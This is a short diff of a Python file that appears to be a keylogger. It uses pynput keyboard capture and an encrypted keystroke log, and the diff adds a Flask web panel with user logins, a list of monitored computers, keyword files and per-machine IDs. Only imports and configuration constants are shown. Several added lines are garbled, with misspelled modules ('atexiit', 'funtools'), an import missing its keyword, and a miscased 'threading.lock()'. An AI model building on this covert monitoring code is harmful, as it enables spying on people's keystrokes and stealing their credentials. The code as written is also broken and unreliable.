@@ -1,13 +1,26 @@
 from pynput import keyboard
 from cryptography.fernet import Fernet
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify,session
 import datetime
 import os
 import threading
+import uuid
+import atexiit
+import logging
+import json
+from funtools import wraps
+from werkzeug.security generate_password_hash, check_password_hash
 
 BUFFER_SIZE = 10
 KEY_FILE_NAME = "secret.key"
 LOG_FILE_NAME = "encrypted_log.txt"
+USERS_FILE = "users.json"
+COMPUTERS_FILE = "computers.json"
+KEYWORDS_FILE = "keywords.json"
+COMP_ID = os.environ.get("COMP_ID") or str(uuid.uuid4())
+FLASK_SECRET = os.environ.get("FLASK_SECREET_KEY")
+buffer = []
+buffer_lock = threading.lock()
 
 if not os.path.exists(KEY_FILE_NAME):
     key = Fernet.generate_key()
